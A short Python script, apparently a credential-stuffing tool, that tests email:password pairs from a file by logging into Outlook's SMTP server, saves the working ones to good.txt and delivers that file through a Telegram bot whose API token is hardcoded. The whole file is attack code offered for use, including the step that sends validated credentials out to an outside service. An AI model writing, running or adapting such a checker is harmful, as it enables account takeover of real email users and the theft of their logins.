from smtplib import SMTP
from threading import Thread
from telebot import TeleBot
from time import sleep

def check_mail(mail, id):
    try:
        server = SMTP('smtp-mail.outlook.com', 587)
        server.starttls()
        server.login(*mail.strip().split(":"))
        server.quit()
        g.write(mail)
        print(f"{id} SUCCESS - {mail.strip()}")
    except Exception as e: print(f"{id} ERROR - {mail.strip()}  ", str(e)[:50])


bot = TeleBot("7093667487:AAEBK00IkB3W3SW81b2bx7l879tFK-CitWo")


emails = []
count = 1
with open("emails.txt") as f, open("good.txt", 'a') as g:
    for mail in f:
        if mail.strip() == "" or len(mail.split(":")) != 2: continue
        sleep(0.05)
        Thread(target=check_mail, args=(mail, count)).start()
        count += 1


@bot.message_handler(['emails'])
def emails(message):
    bot.send_document(message.chat.id, open("good.txt", 'rb').read())

bot.infinity_polling()
